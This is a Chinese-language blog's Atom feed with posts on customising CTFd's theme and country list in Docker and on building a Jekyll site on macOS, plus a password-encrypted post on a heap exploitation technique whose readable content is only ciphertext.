<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>B3ale</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="blog.b3ale.cn/"/>
  <updated>2020-05-20T03:09:07.193Z</updated>
  <id>blog.b3ale.cn/</id>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>自定义CTFd颜色主题</title>
    <link href="blog.b3ale.cn/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/"/>
    <id>blog.b3ale.cn/2020/05/20/%E8%87%AA%E5%AE%9A%E4%B9%89CTFd%E9%A2%9C%E8%89%B2%E4%B8%BB%E9%A2%98/</id>
    <published>2020-05-20T02:32:37.000Z</published>
    <updated>2020-05-20T03:09:07.193Z</updated>
    
    <content type="html"><![CDATA[<p>今年校赛轮到 17 级来办了，搭建平台的时候踩的一些坑记录一下。</p><a id="more"></a><h1 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h1><p>以前练习平台其实搭过很多次，都是用 Ubuntu 或者直接 <code>docker-compose up</code> 起镜像。后来发现 <a href="https://hub.docker.com/r/ctfd/ctfd" target="_blank" rel="noopener">CTFd 在 Docker Hub 上</a>是有镜像的，直接拉下来就能装了。</p><pre><code class="bash">$ docker pull ctfd/ctfd$ screen docker run --name=&quot;ZJGSUCTF-2020&quot; -p 80:8000 -it ctfd/ctfd</code></pre><p>进入容器进行修改：</p><pre><code class="bash">$ docker ps -aCONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES729035bc1dc7        ctfd/ctfd           &quot;/opt/CTFd/docker-en…&quot;   42 seconds ago      Up 38 seconds       0.0.0.0:80-&gt;8000/tcp     ZJGSUCTF-2020$ docker exec -it quizzical_mayer /bin/sh</code></pre><p>可以看到容器的启动脚本 <code>docker-entrypoint.sh</code>，其中用 <code>gunicorn</code> 作为 Web 服务器：</p><pre><code class="bash">/opt/CTFd $ tail docker-entrypoint.sh# Start CTFdecho &quot;Starting CTFd&quot;exec gunicorn &#39;CTFd:create_app()&#39; \    --bind &#39;0.0.0.0:8000&#39; \    --workers $WORKERS \    --worker-tmp-dir &quot;$WORKER_TEMP_DIR&quot; \    --worker-class &quot;$WORKER_CLASS&quot; \    --access-logfile &quot;$ACCESS_LOG&quot; \    --error-logfile &quot;$ERROR_LOG&quot;</code></pre><h1 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h1><p>对颜色的设置首先可以在 Admin Panel 里选择 Theme Color：</p><p><img src="/pics/自定义CTFd颜色主题/1.png" srcset="/img/loading.gif" alt></p><p>效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/2.png" srcset="/img/loading.gif" alt></p><p>改了 Theme Color 后，Challenge 里的每个 Challenge Box 的颜色还是没变，显得不太协调，可以在 themes 下修改对应的 css：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi main.min.css</code></pre><p><code>.btn-dark</code> 是默认的 Challenge Box 的颜色：</p><pre><code class="css">.btn-dark {  color: #fff;  background-color: #343a40;  border-color: #343a40;}</code></pre><p>还有修改 Solved Challenge Box 的颜色：</p><pre><code class="bash">/opt/CTFd/CTFd/themes/core/static/css $ vi challenge-board.min.css</code></pre><p>对应的样式如下：</p><pre><code class="css">.solved-challenge {  background-color: #37d63e !important;  opacity: 0.4;  border: none;}</code></pre><p>改完后的效果如下：</p><p><img src="/pics/自定义CTFd颜色主题/3.png" srcset="/img/loading.gif" alt></p><h1 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h1><p>国外的开源项目总是会有一些问题，这里我们也要把对应的 <code>flag-icons.scss</code> 和 <code>__init__.py</code> 部分给删除，或者像 BUUOJ 一样改为 Taiwan SAR China：</p><pre><code class="bash">/opt/CTFd/CTFd $ grep -ir &quot;Taiwan&quot; *themes/core/assets/css/includes/flag-icons.scss:  // Taiwanutils/countries/__init__.py:    (&quot;TW&quot;, &quot;Taiwan&quot;),utils/countries/__pycache__/__init__.cpython-37.pyc:St. Martin)ZPMzSt. Pierre &amp; Miquelon)ZVCzSt. Vincent &amp; Grenadines)ZSDZSudan)ZSRSuriname)ZSJzSvalbard &amp; Jan Mayen)ZSZZ    Swaziland)ZSEZSweden)ZCHZ                                                                 Switzerland)ZSYZSyria)ZTWZTaiwan)ZTJZ</code></pre><p>由于这部分是用 Python 写的，不会实时更新，这里直接重启 <code>gunicorn</code> 来刷新缓存（重启第二个，也就是这里的 8 号进程）：</p><pre><code class="bash">/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -    8 ctfd      0:01 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   38 ctfd      0:00 grep gunicorn/opt/CTFd $ kill -HUP 8/opt/CTFd $ ps aux | grep gunicorn    1 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   39 ctfd      0:00 {gunicorn} /usr/local/bin/python /usr/local/bin/gunicorn CTFd:create_app() --bind 0.0.0.0:8000 --workers 1 --worker-tmp-dir /dev/shm --worker-class gevent --access-logfile - --error-logfile -   41 ctfd      0:00 grep gunicorn</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.cnblogs.com/huchong/p/9844024.html" target="_blank" rel="noopener">https://www.cnblogs.com/huchong/p/9844024.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今年校赛轮到 17 级来办了，搭建平台的时候踩的一些坑记录一下。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="ctfd" scheme="blog.b3ale.cn/tags/ctfd/"/>
    
  </entry>
  
  <entry>
    <title>macOS下使用Jekyll和Coding搭建博客</title>
    <link href="blog.b3ale.cn/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>blog.b3ale.cn/2020/05/17/macOS%E4%B8%8B%E4%BD%BF%E7%94%A8Jekyll%E5%92%8CCoding%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2020-05-17T06:34:31.000Z</published>
    <updated>2020-05-17T07:53:59.307Z</updated>
    
    <content type="html"><![CDATA[<p>仅作记录。</p><a id="more"></a><h1 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h1><p>环境是 macOS Mojave，像是 command-line tools、ruby 之类的安装就不记录了。用的是 Coding 提供的静态网站服务，经过测试 jekyll 3.5 可以正常部署（版本过高在部署的时候会报错），依次安装对应的 bundle 和 jekyll：</p><pre><code class="bash">$ gem install bundle:1.15.4$ gem install -n /usr/local/bin/ jekyll -v &quot;3.5&quot;</code></pre><h1 id="Setup-Site"><a href="#Setup-Site" class="headerlink" title="Setup Site"></a>Setup Site</h1><p>先在 coding 上创建一个新的仓库，并开启静态网站服务，然后克隆到本地：</p><pre><code class="bash">$ git clone xxx.git blog &amp;&amp; cd blog</code></pre><p>接下来用 <code>jekyll new .</code> 在仓库中新建静态网站，并做相关的依赖安装，最后用 <code>jekyll build</code> 生成静态网站代码：</p><pre><code class="bash">$ bundle exec jekyll new .$ bundle install$ bundle exec jekyll build</code></pre><p>不看 git 的话，大概会有如下的文件。大致上和 hexo 的根目录差不了太多：</p><pre><code class="bash">$ find .../_posts./_posts/2020-05-17-welcome-to-jekyll.markdown./.sass-cache./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_syntax-highlighting.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_base.scssc./.sass-cache/81a794e6149bb69272e907db97d7f50b54a1e9e5/_layout.scssc./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f./.sass-cache/27601696a600f8c750bfb957d6267563e8022d5f/minima.scssc./404.html./.gitignore./index.md./_site./_site/feed.xml./_site/jekyll./_site/jekyll/update./_site/jekyll/update/2020./_site/jekyll/update/2020/05./_site/jekyll/update/2020/05/17./_site/jekyll/update/2020/05/17/welcome-to-jekyll.html./_site/index.html./_site/404.html./_site/about./_site/about/index.html./_site/assets./_site/assets/main.css./_site/assets/minima-social-icons.svg./_config.yml./Gemfile./Gemfile.lock</code></pre><p>可以用 <code>jekyll serve</code> 在本地对网站进行预览：</p><pre><code class="bash">$ bundle exec jekyll serve</code></pre><p>最后用 git 把代码同步到远程仓库，并在 coding 上进行部署即可：</p><pre><code class="bash">$ git add --all .$ git commit -m &quot;message&quot;$ git push origin master</code></pre><p>jekyll 默认主题比较简洁，我个人比较喜欢。但好像相比 hexo 对文章的管理要麻烦一点。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://jekyllrb.com/docs/installation/" target="_blank" rel="noopener">https://jekyllrb.com/docs/installation/</a><br><a href="https://www.jianshu.com/p/9f198d5779e6" target="_blank" rel="noopener">https://www.jianshu.com/p/9f198d5779e6</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;仅作记录。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="macos" scheme="blog.b3ale.cn/tags/macos/"/>
    
      <category term="jekyll" scheme="blog.b3ale.cn/tags/jekyll/"/>
    
      <category term="coding" scheme="blog.b3ale.cn/tags/coding/"/>
    
  </entry>
  
  <entry>
    <title>Tcache Stashing Unlink Attack</title>
    <link href="blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/"/>
    <id>blog.b3ale.cn/2020/05/05/Tcache-Stashing-Unlink-Attack/</id>
    <published>2020-05-05T11:03:01.000Z</published>
    <updated>2020-05-21T13:04:23.431Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Wrong password." data-whm="Wrong hash.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Need password...</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="951e386c401880b661626507b76779059b3c6fbcff2c05b8082f00bb8a636028">333861d71d73cd1ade70dba096941a5501df85e7843eec13a3ec1e0185bfa9e0974001e6113df2bb0c1c298f9f035fc3f1c5447374758fbaa0d10a22f60d5a653514d3b7f29427bee95412c973d1b366b38c9b913c8e4cfb949a06a1f42aee52d62408eefe323f952583bfe2fb15eb53025e93cc646ce3d97ced04d06c0bb7dfe013d280627d62ec2a00aafe54ea8b0007417ffa555f0d23e715e9fc735b45c78bc58a3c020e09a53c3cb42accd931d2b00927b2466250bde55767cb8174b48ff7141c0c5fbf5f1c46567c9ed27f38728e81d670915a1fc93d6f2e4e803e2d27b801095a1ee6dd8e34ac360f5b5fe73291c4ec616ee40ba5eaad67585917f4ac7db0ea0a97a96df5db472c846a39492853a506482089bfe72dbd8cbd7e9826ef91f228517106997a301845cb53b6aa134d6fc0eaa951074feee2640131215878a03b69365921d62d07db7855e7da6ca09aa5e86ea8722b16f6b8cbb18f892bfb26fcbb8b77b1b6b9122fec6662bb57fc4436f2f62c89cf224c6a67c32e27c32c9a04f162150cac258a4891d8c8e625bcf4ded328437ff684fcbeecb029819885b6a433e111c7f03cb09b2ed8731f584a14f89d5a66f4530a526e1076fa52d844990b5d6972bec50d9373f732132476323bdb06cbf489d55d988d65778c275cf397b715aa734f32fac721291ded4c2d2f198a9c0b65b0834d0dd6dd45f922bb28651f29717bba9e6aaa776e702bdcea41818ae4de3547b4ee1fdcb84ff057825763bcdc6dec6891a730d6ad095b75cb67927f645514246ac68e5538e881df96f9201f1e28916cbd647da788da685574f14e76018e45a717023e3f8d3ad64a0cb9f3b0ef14f76da25bed2301a00c309af259d10ab9ef2e57073f5cb2d4cb49d1409ec5f1b3e2c0fb2542b38ac235651c0ff3a29aba822067c7c19b12d8521b0f5f18e57a4aa77e5bd4a0c4d01d7dcfadcadc1902905b7d9beb29bac6e72c973c70af9e9dc17e8f037fd02904721e89bc6e70308b06fa48173d69eee63c1e502b8d235d7cc96b6bd5eae9c2c27c73331c2910896d803904682c805e6f1d7c7befee651245465f9d05b1c408a8594d8f6bdc365b13835207851149ebe7c8f35b10b43c155d0287939942564b7adaacdce333feb2e1d9dcc053fb6b65476c58f1aa9db9502d53aa55e1f16b05eb842596cb439ff965ce4d335e36d750b3c7ea3a1c30ab0318b5fcc5bf119ab37aad2346688f0927ced117c17fc1b35fda1778ca74114a5c0c99aff933ca73a5b83c4913b7baa5ba77c8ef7f3610f550242112809d9b3840df54c1345412d725fb376e8a064b5cb93183b2ec2a0ce715f6a4e2829edd66d506a86c6386db5113afb092f06ec1ed28c2efa3854fbe564dff9ed3cecaa4fb2c1aba18b3829519f3417f25a3e3dfae2f03858f09196aef02c35ee968cc485a9c69fc0506cb0b1863a499843974c84eaad8bb9018a7c27490106967cf362b1fcc1320407f99e6997272f8bdb282592b0c37139078e5a7fd52b82680c7bd43e000e9b200aead5a23a0d77c6e70f5e42bb5592f82ffd9c497e86dcb4261a84dd7a78dcbddc2de2be9547a38e345fb17d3c0bc71ed49299885cc0ab5ca832ce21c0ece81b4ccc4cb1bb5e0daf03fa3b62abbaf587a50a7932624a87d9dc63605973802c9d7d1f268c4932ae90bc5d9fc61938bb1fa17a7fe68e09c734285594b976432c15dfb63245ae22897212c645237b27525156bb5ea8fe420d1202c45280862b57a16228d2ea60b02251aca6d06e5219a26e0cdf1f319261f71904b6da005d241834139f43c3d9bff17e0b7b6815ae9cf8580f36f5b406137f77b6f5acd624a6658747c4a489b02661f7fc13df68305e1b2b8195fa354cdec849b8142101c6c0251894a4969764677ce857732a76ce39f5ddc209fa3d4c01cae9ba9173066847b6a617e34e20f55aadfd6780b17b3c144b5d03dd8db3d114e455ab0a8fed7aaa95dffa0873f60544a144d5f0592a9d43c7e7a4cbcc4305a0e9649432c19d1b5d3a6b3f15f7bfdab50c86f5be21dade51964f56a80396747406a0eb71701bc03c39cdacaf6c359baf8537783b0ec7031be348f85e7542de25c63183c4cff12fe33e453d0cb932817a6dd8fba0935cf60d133a541fd94a58788822ef1f13bffb852034004f3f0cb6ec315029bad4e5a462df4999453572acf27ea266ccbf04c358bad9c29fd71b6dae185f1682daa501da4608da764fb20bea963cc9000d2e14127046327568efa323ea51b6dcfef50613f2a070cb43c9cafaaab3f83c2e72789919deb4a47a18cad0114ca24396c95e79a9528b0e3b38c0147cf30b3f675cadabd6a158e3a1c9caa0327f63cd8a23782d1abc2ae07b42387b396abb475425d858ff2984ee812da7625ce2cde1026681f201b16ab3cf52e3fef3e965b80f3ad7bf6467698bd31b839d95678abe6b3c3911a13a66fe604c6d8153895804eec930ddc778e3a3400ee9e0e668df4905aacd7f200be8f9fc73d1331ccbb43da2620b497771388ff8cae036f84f54bec5217c70e30044e12772befbf478ed5c939862187e36970120b57342d0082853b512b5dfe9a5f24c426eccc8f73b3a86fbb6427e9e583ab16f35326a562e5e272606d986d9cbb69baae47297d9ed5a5754c862179fa2adaef33bc676ac69a44405317f15064d27133bad176c4837829f6dee0ca8c9e02c521ab30592ce2c03f6cf7e755b710f459113059ebecd6c0f215448fef6496873eed5c671677676194931790ab2593ad9a6ee7ebab135b68cced6ad72cde47735c2509b3adc6b37d913ade3d612a69d2ce16d9d60f83190f2c88ef8eb1301a94b008f300bb892495eb2871ab53e4dcaa7b71c9cd554a334a8921b93f2e07b8674b06b5f69159792c8eaf8881c4b2478ce464910d27d70dfb97ecdb97b65497ec703bb2c63b4c4b706a193884e95e0659b700847a72e70693fcb51b8556aae71df5500b01e4a6417af73de82542d83a488bd9464ac073c59844f6c456cf67c556b75a3258ecedaecbfcf88fda29bb75de9ff4ada3116d31d29157f3eb23cb2f95a5b9ff0911dc0ce81538262fc500271e0ca6a99254338887e74aacc99b698b531e1056b7eb59f37065ed1aec3e5f4cdc324e01f10b5477ebe37f6f462126458308aac8a3526b5740fc22fe243190de23c800d46a7760b70d23e14cf57a99400d252a482cfb4430e537af8612887e16edd26f9792c2ec0b50317114574c43870bbdd8821db7ac717dea9e6aaf8ef9175773af2b95cfa1b274a9b9b1d474d56273bf90bf8ab11c292c3eabd485b338713c868330b141aad9d9cbd4072d81a8112ac636d712baf8eac969708aa54bca437d22bcfba7072bb059fa5315113603f93f2581fa34f27c0dcf6e3b42820e597ada6226589a349232d657f98820b3d2225411e321da80856cae8e45ea776c79179bdaa13d8908014625166dc779160cc775e192c92a3c26659f8171b9bbd787b026eb63c88282b6f478054621586f275a33849887bb061b9e92d8d18409e3b35c4932451174fcdbe5c5761309f22a3d9e3eab9c76d66870c0c7aba2e2b54de4d040d3cfa4314ea8dec3dd3dd815dd1949ce4cc720c654e0491132db122639cf0d5f9e6787a2f52a418b23f5b9b83e773123acdf370d6483203e113554a5bc1838f14d93686634413f5bbd35f880298663816fbd8482088b6e5da4d833f9b641fc628b83b24745d2243bd475d9610bc5dc0234ebf0fcdb7f776f003bbc4e4c20d437a8ade7c283b309c5e58bd8abbfb02a63f73fe9f262fa284e9f066a2354118b0b24293eb63142c994e2183f5eb9d56f454c86730f73c9aa793a9158aade317030e3dfc238e581a20e6f9677bcdd8cfe0cc59b70c377ef5f71634fc207dfe753fc5b750e81603bbd5da5f86207e6522c804903aecf4841c852cf2029688b3df476471f8bbe4bc394b365051b1aadf3a514fdf551ecb3f909edde870257e87a251463e2db71f56b493a6659449bf9b21bc8c460824920e36021ee6f0818840d1299362bfa9e1f4ebc65c2312cd927323cfea162c44efeca581d0f7f34e51038cae62afe21a8693e440198d206990d2e322403dd11b1ed4279fd1602e8d1349a43e6339f02df6bc215ad69d8800547b0986f4ed0652bb913757f1b2ed5843021f98ec2eaf5d8542750657be170f33ef33fc664c4252e7b97cd1f9d02970cf037ad75b747fbd082270a584872ed24914f98c3bf908cd85498ec71b4261c9108f2146d41d03d256003708a282385c6985c7d52ec0fc85a937643f65fb30ccf14c9bbc40c7ba2fdea57e3d5ef9e4af5f4add5fb8dda05f9b3530adbe761cb969b9ede183f92f2fcf6baa06901aebd17d99df42d40280fd04b3477598a63b4dc58524600500b9f4b6df7d5cd1bdc7abafe768731780be359684c75e85e7e4131cd4c450a6019d4b1e97d5f7684d8cf979783040cee43ebd3ec22a7bdc648dd22fa57751a515ceb24e588bbfa7d152104f68cf87afa5d52fde33fed853f638f4051fd5eca644a0c73f019c0b58bfed1cd01299c9c82cace4f3e2998231db9efd50075ca1e4e0847c8417e9c27b3e2d89501fc978cad337b6304776d65782ae806692a09eb85ef11fbf212c46f399a5edee3641475bfc833521139c467a8b437af86619a63118c7c95b67d948c5be56a5ee0f3d2380594b10788c78c5951c93ee457d30aa4fc4066c740e688d3720b8db9bafdc878452de2f0bd4f6dd9629391701bcb5e2459f7a49de18ec80ad89242310e739bb8cff20af9136b824abad6356eb44acd7a48481ada8fc2ab874a771c4273e2bd389f43637d12e67623becfdbc4521ff0712f27a7fa3fc10b62dd4ee8ef2e157e307debf3d51879626dfbb4bb42f1ecf79ec83736ff45a4c483bcf64123934c7d7ca219dfebd331f050c5a43856cc0e1dce3f3a88eae3586517e33f8fb0aa68ab0e95d5fbc8170b570a4d07060054ff4ffff8e21c1184b875f830557bbe0d89e4c3b53d600bd78e5bc904f5847082e64a8fd0760cc2eaa3fa111dbb0d5ee13e95ae09166268fda40d7794502d0405d5ff663650a1d90cb7632ee5d5982f80a3fb41b1d7f3c93cbbb34285d5096c14fab2f2df7d59a404718e793af41fd5dadd9c8a324df49a97331078ee76f790d8b2756cd293a60a841f83d7a4296ecc8e1b7fb0b89d3a72883f9fc224ae0bf934a0261cdb2eed315c4b326fcb2d496a7d73638b6213e328bda962f181aca438f936edd7c0f9b6c1b24c2a6d7628a64d12070b9af1fe49ec2c1e633bc4cfdc6073cf9c034b58fb70d99327d6ceb662c56af88fd22775fe5a1547756b9afbd48fc0e11cd5d3ba551a21a1fba55e5fe2e1ef86dc7c44ee6ff73ed226546a2d139516c55e00e73540e4d36035fb7110281de7314ccfec97ae44390c31568831c6b0a88aa3eade861020132c36b31c5ade0891f014c235dd9e112e0f28d2c5fdda8ed0d8fc70c67bfb7c2ec57530cad5dbc8347b63193704df3f77de53f1c8f54426f1b55cd1135a678b77dfdc2b3aeb9a6b8554d23aae91f7417b9a1871ca9440a2d5ccd96b35c94abf0258485aec4bfa4e733841b29174a21eb3b04d450ca134102643cf4cb18cfd42440b9728786fa8f17aa67568084727614589b95c543462d98a30cacceb11553b0cb35a4093c72ed76ed4a516a90e3ee610c5bea1342fd5c0081e7b4f7941f5f3978d5617e5862c0aa4a7344ec4e9a838bbf7f1d5ac88d85369c00ab625e8ede6b62425310a0b7af2ea932f267fd104e9b56f95ab795cf272429defa28d6003cd7231708bac2221eaab2d34effb570b66509206ef827e9cd71892a46a7ac28ed166ce9f7e04fd2b615bfd7eff0d8860d50a38f1a008e1db49404141e9b4f7aa346ff8f1a6675368ccd012bd5c0798a83df9a4902bae21d58ffaf738414f855f9e4e1b2b220241cd19f6593d55a453fa4aa7754c817a4e220ac03992bc14ddf0ae6b117bb0447821853b52e2f9068fc9bce87493ee4bd27c38729f346f50896feb24d43d0875ff6f6ee8051b3c9429b17c081c8abe8a7e1dcb4598c9520d647755f32d5478efa5fd87868b8e9a29dd651acc007a10105bac38571f37310602dd72e2e64af559cba845f0bf311762968d5f033079eee38f3a30d098fc75de70e9a430e4ae2c35f45889707afe1ac97eb27d1120d2c66c2a6f7f2cc7392ef4d080518ba1884dc3b2ec3256fbd70544c0b2cd7c0f88904a76b42a1cf65b7be0c1ea065da248401fe4e1198d4979b2e4c09f7cf857c6a98de355009b70e1366a40ab7af2bcbd61eb1389c34b688f9a86b906b2b8899a6752b1e2a19347436b828d3262ab1630cf4876ecb13d87a161f6bc0e63ba510ded3ae5ef45770a356b3fc23ba8d4829c2cf8c0cc8b0ee15fd0a8a032ee07cd8284f008f52eacdec6d165845cdf7f80aed84da3af89f1d4282354b364293365fdd3fb7b21bc381f709270e4c72b03c5db02d486de178462e49cbb99fed378e4707d86213027f5723722368756b0012a7ecaec914eef56a940b7db3b74d6d108ed08dafd00562027e966402c3f14c702a9fde4a11f8ce7976108f6431ae272108424c8ad54825ecad94ee6995b01b76dfd726e284f1cfc497b820899bd2e407ed81bceaa7438408c3850624d7a40da414d0bf3648b5712aed0697914c61baec7c480b2ab673cab5afdf5f019e151558f9969667b830dc47014e6df218a707a0e0651097c188f543aa0ad1b59f28b0f8ae8de1d8963b1fd41636fdc9d255529725d363fc317db09f66a84a5a59493d8cea10b07af18505ca6fa3378810143fa0efcc629d256d5411514fcfbfa5041ae07487c4fc47118fa91cf6658f10c13772132dc09c54cf2d2379f37c73a8976ef0809314e8e6130adca7831dc96d6432d63cea92bee6199f1d71f958131c09aa19f89807ddd7ebb970557b1b558dffb8eb2df783d3e90e02538dde0736ca9d4ac42bffc7a81ff7ed22ed285f23c44d8d343cc5ef7c7bef980fb84d02acd671081e5f3cf5f3f2ee75d9c0b75957b31f4014202a7239b6f7940c912551ead93e7f5df1658512172d198e014c6f9d54e94baa09a364804fe51bec6814b84897ea8a62ff9ae18172684e993c96bf1680f9bf59d936b05b14213177ea73f2eb1468171ae462cef1fd031d956bbb1b470724afe3a270d15eb435cb1df8c670b43b614e393730a2d3aef7ded1811b29c6d10f55c50b012fdd0e926f303b9f561a71b940e64ceb9330b1cc381ded5b26bac1380261f526e031ec98fa6cd289c3848e274a5898895cd65c8e9ccd1495dd583829f9fa2444107a74d34a40cf76ab183749308756f8c70a27c029cc960a09bc889a262d7d62b8d1cf44f3dda11a4c41e3b7a9d9e30c89f945a0c0130c0e5aaed030e4b3bf2dddace5b74a28a4d42d2b5dcca789afcc12c34e5a6b031eff3dc583476b4b3ddb118de2582fd6860b567c472eb8d5b286683cd2476e6d6ebdd5832e201b6de6f3fea61417e7ced98e138f89e9899d643a336e9173fcefe534efb9e99974ee9e186fe67d4c793d4c08d18c969cbd53a96169ed61d9eea871077e19d67748063ac834acb8494414cddbc312719d1dbbeea37e38ed641b27725455c355778659b3c09531a8c7dbd68bb761cdf97b7599e1ef34e3e2568c255f857b930a97d5f6c39372ff6a0d9ac9ee566e121f66a8f015fd588761ed94e502674fc4ddc29400bb7e2f838cf74d8941b66e1db0dcfe929a113ae78fbcf1f1d25c56a6711e34921e26b05c554505a416be7e99f782834922edb6b93aa04305ff5412bac322c19891b9fbc00d0726d6068eb96a446e74b96d82824c82e931008cb20d14b72cb76449da1a5e25e6c6ed1bd0c31a46ffed6367e47dd857c36533a7e3ccd3437e83e8110d3396dd53a2d112f0bc70168f5e00b8f56b09d05eb6079b9cda131f9fdf8a8b1c8476c0965eaed2c9c03209b108b7397c291df7d77104d22fd130bded13ffbe9f59873b672bcff4e24f852f0971c611261b6d8d7eb7d7ce65d696b3a49f9a05c4d78ec5ad98ad7850e122804e265852901844ca14c82ebc053292188b7636dc15909f526a3147b6d3e6c43a4ec923aa12190c1c9f17f279859080f36e55d736ed5da0b0d513514625c7be7d0ea23f7ba60530e914e84509d9b9e1a1d6948d777904393c65a4a9b0d146f990422711050bd392d895d8851240d227079adecfd6887021d63007b62aed2ab3623688dcea356d97edde8398392db6d3310d8c35142b804831c8acf30c92951347afdd94cbd58f293af25dcdf670da111231cd30ce016bef66a533b9cce30a52922994fe8d0c0e315b5a81d1e389f46a31aa6035fed6b682cf2318a831df2021c4d80b7219c5d83a2080557045c9da8154197d71a3843267b0c98ff963c07177817539ecceadf8402ade5b75e8a95cee39c28cc418a1c5317f8442d1b07b03f6f13b19840738d599202a385bedfb6d3de9440bda7f32b80332e41a79368bf8a18931a08684c9e792a561dfe48d8f4706050c525cf9405d2888d620796efbef02f35685c238ca59b2a4489cfa5171f05f55809c1cd299dfecca99195b24102d8aada4f85c745016f0a890029af58ee4065af77b0fc6a3d481fc8a2e87084584444703abefc996d38bb80f8add7ef39500e5d9ac34a08dd6fdc2dad41ea16f96139ee8ab3f05cb995139fbcae06e615f386ee06b640c2f93ef8832e583b1dc67d855869e1549d6a2b753a2e9e4da947d7931b84f654208ed798da97669411502a99d877b6744b4032519db3d726a9600e2a35bd39f854307a0232b4990e6b1eef9c755d3964b591cc0fc9654c5572636fee0f17f977b5f316702b443f7635a4517d35333885bc2853d3648e107db777b1ed2e2b471c319fb2098252346c01667aab8ac68a5d0485f8283b5f4fead1aa212d1e8206937574fc6a9dcd4c0339365125eccac20b30f88ee3aae17aa5c20bae203f10acd3e684ff4f62bd9114466feaa6d6ea007504bc2b83be46422581f61dee44bba3417811f72bf39bcc55b38d080454e7671db916d6ddd6feb9f7ec6895c58e558d093c3ab14018b94ba5827ec4a2d252f40d44c81faf5c7c494c7b42e396256431ebcb86f671a2deb0b129792d24685e1bd8f94f7a7e7914eae28af7256bacdeaa3d7463a3b1585decb108365f3312fbbd014c9e01858a6cd2ec7cb39dc0d6c3e7ccbd3357b5febd472fd244fb246c413f6edb84381d0cfc1edbd6cd383a26f5b9922ac252e5b2d47b36138eb016516c27bcddfe6d55c978d3b56a55b2b05f11b00f093dcb05174118b8c9d3fc87374c0077bbea6c640cf97e6d90c20500ab59efbd61b91e434e548d64c12ee69d0a89ea52116d49c9af252cfb81904e2eee3dd53acc56bb5515432a75a891673c04fc2d0508544feadfeebf5c1c30badb1b40822628ea45897794297badbb8fdc458bce93376f3717fabb3a87db0d28b862299c54022cd9b7c487b005df23ddc63eddbdbf50f0fa58dc142f2b0555f5171eef657df92b4e232637034eba336a41cf80103ca5b53207a4542d847d33e37185232bf7f4ea73b3acbf22d055d1c8a7f8306efca591d2285dc31b23a0903e5674f31018e8e2e86f1c80ffbe336aa62e7af74e2db7752e12eb63f16c07c6931e45b649f99ddf6e1afa951c24fe6f0b33fac8747b908cdfb43c25815522fdbb0c4f90de062267f8a64fbe753e58838c9e063793e04e1810f707a897884b4b0e0167b2428f6c4bc96f10bdac9a8eb3f23c5c66ccb6d30b8cb18da2a5a7bf74d8b370fd18a1768b4d507760d301e5395c4570cb170c1f02136d17e747b4e4511c7a349a350743e5825ff61c8edf23cba2712e36f9cc98b511a7d205534a65a55ff3fcd07a23ab2199a0f83664b289a4ca0c66df8fb328c62790435a2807cd540297cc443cbc0515c5d394dd44e49028f4d5dcf9d5442292f916275efec5f1c4a6de94c5df9414e344693e97914d4ca3711fa48825491569afc6ff7bc25ce33d87d94e83f37612c3f6b9245518c84957d0f1605af704ac4b1d5040cc00fc6da9b994b99330bd4ea8c98f189f19254a6452b6058b1beb7ce8dc296e1c710374d2838f9707459cccd0c6ff7effedcd3b189ec016b91d062ee40f566a1580a96234e1fea307d7753eaae68eb7ed4f31ec80bd585d49bcbaf204e0fe44eb841f0ca6d3925e296c57398dd43ea1a05a38dcd69589c84825f6d19af6b1fe62a3b07e9f3d48de15bdd42f12d61f432420e33d5c6388999b83f7bf92ae58d2a5f31cf558415eb53ca5a523268d1310bb38da3f70738d409d2c6a915854f1a9cc674695c11b1426c223ae4088775fb13a7f69def00bf0a8d5d4ae6c9a2c61469e6a5a7199252ef9e0eb7379cf8a1d6b53557ec592ae3e86b14262863d2eb050be3463663b94c28b0b9c2b6d9c3a7b51d64651acb3c5324123f0e8e735dcf942c52088dbecf70a71d24c2b35a205a23e9cfa9fbf44496f005a6237914570ea6c6